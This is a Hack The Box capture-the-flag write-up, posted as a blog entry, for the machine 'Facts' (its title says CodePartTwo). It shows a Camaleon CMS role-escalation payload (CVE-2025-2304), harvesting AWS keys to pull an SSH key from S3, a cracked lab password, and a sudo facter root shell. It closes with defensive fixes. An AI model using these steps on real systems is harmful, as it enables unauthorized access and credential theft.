@@ -1,0 +1,341 @@
+---
+layout: post
+title: CodePartTwo
+date:   2025-11-10 11:05
+description: Hack the Box CodePartTwo CTF Write-Up
+tags: hackthebox js2py
+comments: false
+---
+[Link To CTF](https://app.hackthebox.com/machines/Facts?sort_by=created_at&sort_type=desc)
+-HackTheBox CTF WRITEUP-
+
+
+<br>
+## Starting with an Nmap scan:
+
+![img]({{ '/assets/images/facts/1-facts.png' | relative_url }}){: .center-image }
+**************************** 1
+
+
+22/tcp    open  ssh
+80/tcp    open  http    nginx 1.26.3 (Ubuntu)
+|_http-title: Did not follow redirect to http://facts.htb
+54321/tcp open  http    Golang net/http server
+|_http-server-header: MinIO -- InvalidRequest
+
+We see open ports 22, 80, 54321
+
+<br>
+## Enumerating further:
+
+![img]({{ '/assets/images/facts/2-facts.png' | relative_url }}){: .center-image }
+***************************** 2
+
+## We see port 80 links to http://facts/htb
+## Let's add this to our hosts file:
+
+{% highlight bash %}
+sudo nano /etc/hosts
+x.x.x.x facts.htb
+{% endhighlight bash %}
+
+
+## Navigating to the Homepage, We see there is not too much here
+
+![img]({{ '/assets/images/facts/3-facts.png' | relative_url }}){: .center-image }
+
+
+## I ended up failing at a possible SQLi attempt at this URL:
+
+![img]({{ '/assets/images/facts/4-facts.png' | relative_url }}){: .center-image }
+
+
+## Enumerating the hidden directories:
+
+{% highlight bash %}
+feroxbuster -u http://facts.htb -s 200 300 302 
+{% endhighlight bash %}
+
+![img]({{ '/assets/images/facts/5-facts.png' | relative_url }}){: .center-image }
+
+
+## We can see the directory path /admin
+
+
+## We can see it redirects us to /admin/login
+## We will want to create a user and have a look around
+
+![img]({{ '/assets/images/facts/6-facts.png' | relative_url }}){: .center-image }
+
+
+![img]({{ '/assets/images/facts/7-facts.png' | relative_url }}){: .center-image }
+
+<br>
+## It seems the website is running a vulnerable version of Cameleon CMS
+## We can take advantage and exploit this !
+
+
+## Useful links:
+## [github.com/CsuriBird/CVE-2025-2304](https://github.com/CsuriBird/CVE-2025-2304/tree/main?trk=article-ssr-frontend-pulse_little-text-block)
+## [linkedin.com/pulse/cve-2025-2304-camaleon-cms](https://www.linkedin.com/pulse/cve-2025-2304-camaleon-cms-290-privilege-escalation-adam-v-wtaqe)
+
+Essentially because permit! allows all keys under password, an attacker can send:
+
+{% highlight bash %}
+    password[password]
+    password[password_confirmation]
+    password[role]=admin
+{% endhighlight bash %}
+
+
+## The post request should resemble this:
+
+{% highlight bash %}
+POST /admin/users/[id]/updated_ajax
+Content-Type: application/x-www-form-urlencoded
+
+password[password]=newpass123&password[password_confirmation]=newpass123&password[role]=admin&_method=patch
+{% endhighlight bash %}
+
+
+## The application will accept it, upgrading the user’s role from Client to Admin
+## We can modify the 'change password' post request to exploit this vulnerability 
+
+-------
+
+
+---------
+
+Idea is to inject any of the following below:
+
+{% highlight bash %}
+user[role]=admin parameter 
+OR 
+password[role]=admin 
+OR 
+password[role]=admin&_method=patch
+{% endhighlight bash %}
+
+
+Then URL encoded if necessary:
+
+{% highlight bash %}
+&password%5Brole%5D=admin
+{% endhighlight bash %}
+
+
+## If you want a quick script to automate this you can find a useful link here:
+[github.com/predyy/CVE-2025-2304/blob/main/exp.py](https://github.com/predyy/CVE-2025-2304/blob/main/exp.py)
+
+After downloading the script and creating a user, run the following:
+
+{% highlight bash %}
+python3 exp.py http://facts.htb <created_user> <created_user_password>
+{% endhighlight bash %}
+
+
+## However we will proceed to do this manually, as it is a simple task
+
+
+## First log in as normal user [client] and navigate to Profile
+
+![img]({{ '/assets/images/facts/8-facts.png' | relative_url }}){: .center-image }
+
+
+## Then click on "Update Password"
+
+![img]({{ '/assets/images/facts/9-facts.png' | relative_url }}){: .center-image }
+
+
+## Intercept modify the post request with Burpsuite or Caido
+## append &password[role]=admin to the end of the password update request
+## Dont forget to URL encoded it: &password%5Brole%5D=admin
+
+
+![img]({{ '/assets/images/facts/10-facts.png' | relative_url }}){: .center-image }
+
+
+## After sending the Request, We can hit UPDATE
+## You should now see that we have escalated to an ADMIN account
+
+
+![img]({{ '/assets/images/facts/11-facts.png' | relative_url }}){: .center-image }
+
+
+## After logging in I was stuck at attempting to upload a reverse shell to the media path
+## All uploads were being redirected server side and would download instead of executing in the browser
+
+
+## I found success staring me right in the face however 
+## We can see aws s3 access key and secret key listed in the settings tab
+
+
+## navigate to Settings -> General Site -> Filesystem Settings
+
+
+![img]({{ '/assets/images/facts/12-facts.png' | relative_url }}){: .center-image }
+
+
+![img]({{ '/assets/images/facts/13-facts.png' | relative_url }}){: .center-image }
+
+
+Aws s3 access key (*)  - AKIAC393BF8B045D05C7
+Aws s3 secret key (*) - VvcbKhlXTSEgwW3sDV8wJ2u1XIJiPfWp+Fk6oAfr
+Aws s3 bucket name (*) - randomfacts
+Aws s3 region (*) - us-east-1
+Aws s3 bucket endpoint - http://localhost:54321
+Cloudfront url - http://facts.htb/randomfacts
+
+
+## You can also find a quick script to automate the role escalation and credential harvesting here:
+[github.com/Alien0ne/CVE-2025-2304](https://github.com/Alien0ne/CVE-2025-2304)
+
+
+## We have now obtained the exposed AWS access key and secret key !
+
+
+## lets run aws to see if the credentials are still valid (install first if needed):
+
+{% highlight bash %}
+aws configure
+{% endhighlight bash %}
+
+![img]({{ '/assets/images/facts/14-facts.png' | relative_url }}){: .center-image }
+![img]({{ '/assets/images/facts/15-facts.png' | relative_url }}){: .center-image }
+
+## After setting the information we uncovered earlier
+## We see the credentials are active and allow access to the internal file system
+
+
+## We can now enumerate the available S3 buckets:
+
+{% highlight bash %}
+aws --endpoint-url http://facts.htb:54321 s3 ls
+aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal
+aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/
+{% endhighlight bash %}
+
+![img]({{ '/assets/images/facts/16-facts.png' | relative_url }}){: .center-image }
+
+
+## We can download ssh key and authorized key from /internal/.ssh./
+
+{% highlight bash %}
+aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519
+aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/authorized_keys ./authorized_keys
+{% endhighlight bash %}
+
+![img]({{ '/assets/images/facts/17-facts.png' | relative_url }}){: .center-image }
+
+
+## You should now have both /authorized_key & /id_ed25519 on your system
+
+
+## We can use ssh2john to convert ssh key to hash
+## And then use johnTheRipper normally to crack hash
+
+We now get the ssh password:
+<style>
+  .hoverblur {
+    filter: blur(8px); /* Adjust the blur level as needed */
+    transition: filter 0.2s ease; /* Smooth transition */
+  }
+  .hoverblur:hover {
+    filter: blur(0); /* Remove blur on hover */
+  }
+</style>
+
+<span class="hoverblur">  
+dragonballz</span>
+
+
+![img]({{ '/assets/images/facts/18-facts.png' | relative_url }}){: .center-image }
+<br>
+
+##We now have an SSH key and password but no user name
+## We can determine the ssh username by generating the associated public key
+
+{% highlight bash %}
+ssh-keygen -y -f /path/to/private_key > /path/to/public_key.pub
+The -y option tells ssh-keygen to read a private key file and print the corresponding public key to standard output.
+The -f option specifies the input private key file path.
+{% endhighlight bash %}
+
+![img]({{ '/assets/images/facts/19-facts.png' | relative_url }}){: .center-image }
+![img]({{ '/assets/images/facts/20-facts.png' | relative_url }}){: .center-image }
+
+
+
+
+## We can now log in a Trivia:
+
+{% highlight bash %}
+chmod 600 id_ed25519
+ssh -i id_ed25519 trivia@facts.htb 
+{% endhighlight bash %}
+
+![img]({{ '/assets/images/facts/21-facts.png' | relative_url }}){: .center-image }
+
+## We can now easily capture the USER flag!:
+
+
+![img]({{ '/assets/images/facts/22-facts.png' | relative_url }}){: .center-image }
+<br>
+<br>
+<br>
+<br>
+
+# Privilege Escalation 
+<br>
+<br>
+
+## running "sudo -l" we find trivia can run the binary 'facter' as sudo 
+
+## GTFObins describes the exploit steps:
+[gtfobins.org/gtfobins/facter/#inherit](https://gtfobins.org/gtfobins/facter/#inherit)
+
+
+## We can create ruby shell code in /tmp called 'hacked'
+
+{% highlight bash %}
+cd /tmp
+nano hacked.rb
+exec "/bin/bash"
+{% endhighlight bash %}
+
+![img]({{ '/assets/images/facts/23-facts.png' | relative_url }}){: .center-image }
+
+
+
+## Then we add this to the facter path:
+
+{% highlight bash %}
+FACTERLIB=/tmp/hacked.rb facter
+{% endhighlight bash %}
+
+![img]({{ '/assets/images/facts/24-facts.png' | relative_url }}){: .center-image }
+
+## Then call the script as sudo
+
+{% highlight bash %}
+sudo facter --custom-dir=/tmp hacked.rb
+{% endhighlight bash %}
+
+
+## We are now root !
+
+![img]({{ '/assets/images/facts/25-facts.png' | relative_url }}){: .center-image }
+
+
+{% highlight bash %}
+This machine was able to be fully exploited and pwnd! Starting from identifying a CMS vulnerability (CVE-2025-2304) that allowed role escalation by modifying account parameters to achieve admin status. I found a few scripts for this already, but decided to complete this manually as it was pretty simple and straightforward to change your role from user to admin. The website configuration revealed cloud (aws) credentials which eventually led to revealing the SSH key files. With user access onto the system I was able to abuse sudo permissions to call a malicious script that allowed root user access and fully compromise the machine. 
+
+
+Key takeways:
+
+- Update the CMS
+- If not possible: Replace permit!: The vulnerability exists because the updated_ajax uses the dangerous permit! which allows all incoming parameters without filtering.
+- Only allow sudo access for specific, non-interactive commands. Avoid granting NOPASSWD
+- Restrict the scope of cloud IAM roles and credentials. Ensure that even if a token is leaked, it has no permissions beyond what the specific instance requires.
+- Never store cloud credentials or database passwords in plain text 
+{% endhighlight bash %}
